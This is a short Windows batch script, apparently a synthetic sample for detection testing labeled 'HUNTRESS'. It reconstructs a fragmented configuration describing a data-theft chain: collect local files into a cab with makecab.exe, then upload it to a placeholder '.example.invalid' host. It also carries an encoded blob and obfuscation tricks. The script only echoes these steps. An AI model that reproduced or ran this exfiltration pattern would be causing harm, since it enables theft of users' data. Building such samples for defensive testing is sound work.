@echo off
setlocal EnableExtensions EnableDelayedExpansion
rem HUNTRESS-CODEC:plain_fragments|rotate_left
rem HUNTRESS-MATERIAL:7Hpi+OboyuDmetjexsLoyr7Y3sbC2Fjg5MrgwuTKvujkwtzmzMrkWOrg2N7CyL7kytre6Mr4wsjC4OjK5HrawtbKxsLEXMrwyvjm6MLOyr7G3urc6Hpi+M7kwuDQeszC3L7e6uj43Mrw6L7YwtzO6sLOynrc3tzK+MbC2uDC0s7cvtLIesbC2uDC0s7cWmRuZMLGym7KyMr45t7q5MbKvuDC6NB6hnS4qubK5Oa4oOrE2NLGuJDq3OjkyubmmMLEuMbe2NjKxuhaZG5kwsbKbsrIylzGwsT46uDY3sLIvurk2HrQ6Ojg5nReXmRuZMLGym7KyMpcyvDC2uDYylzS3OzC2NLIXurg2N7CyA==
rem HUNTRESS-EXTENSION:cmd
if /i "%~1"=="--inspect" goto :HUNTRESS_INSPECT
if /i "%~1"=="--plan" goto :HUNTRESS_PLAN
exit /b 0
:HUNTRESS_INSPECT
SeT "fragment0=v=1|steps=locate_local,prepare_transfer,upload_remote|adapter=makec"
SeT "fragment1=ab.exe|stage_count=1|graph=fan_out|next_language=none|campaign_id=c"
SeT "fragment2=ampaign-272ace7ede|source_path=C:\Users\Public\HuntressLab\collect-"
SeT "fragment3=272ace7ede.cab|upload_url=https://272ace7ede.example.invalid/upload"
goto :HUNTRESS_SEPARATOR_DONE
echo HUNTRESS_SEPARATOR | findstr HUNTRESS >nul
:HUNTRESS_SEPARATOR_DONE
rem no neutral statements
call :HUNTRESS_RECOVER
goto :HUNTRESS_EMIT
:HUNTRESS_RECOVER
set "recovered_configuration=%fragment0%%fragment1%%fragment2%%fragment3%"
exit /b 0
:HUNTRESS_EMIT
echo(!recovered_configuration!
exit /b 0
:HUNTRESS_UNUSED
goto :HUNTRESS_PLAN
:HUNTRESS_PLAN
echo makecab.exe upload C:\Users\Public\HuntressLab\collect-272ace7ede.cab to https://272ace7ede.example.invalid/upload
exit /b 0
